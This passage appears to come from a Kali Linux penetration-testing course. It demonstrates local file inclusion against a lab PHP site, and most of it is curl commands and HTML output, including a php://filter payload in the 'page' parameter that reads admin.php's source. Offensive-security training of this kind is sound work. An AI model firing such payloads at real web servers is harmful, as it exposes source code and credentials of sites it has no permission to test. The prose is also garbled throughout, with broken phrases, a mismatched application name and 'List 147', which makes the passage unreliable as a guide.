Penetration Testing with Kali Linux

We use the php://filter to display the contents of files either or without encodings like ROT13 or Base64. In the previous section, we covered to include the contents of files. Using php://filter, we can also display the contents of executables files such as .php, rather than executing them. This allows us to review PHP files for sensitive information and analyze the web application's logic.

Let's demonstrate this by revisiting the "Mountain Dreams" web application. First we'll demonstrate admin.php as a value for the 'page' parameter, in the Lasting Unit.

```
kali: $ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Maintenance</title>
</head>
<body>
<span style="color:#F00;text-align:center">The admin page is currently maintenance. 
```

List 147 - The contents of the admin.php file

List 147 shows the maintenance text we encountered while reviewing the web application earlier. We also notice that the <body> tag is not closed at the end of the HTML code. We can assume that something is missing. PHP code will be executed server side and, as, it is not shown. When we compare this output with previous inclusions or review the source code in the browser, we can find that the rest of the index.php page's content is missing.

Next, let's include using php://filter to better understand this situation. We will not use any encoding on our first attempt. The PHP wrapper uses resource as the required parameter to specify the file for streaming, which is filename in our case. We can also specify absolute or relative paths in the filename.

```
kali: $ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Maintenance</title>
</head>
<body>
<span style="color:#F00;text-align:center">The admin page is currently maintenance. 
```
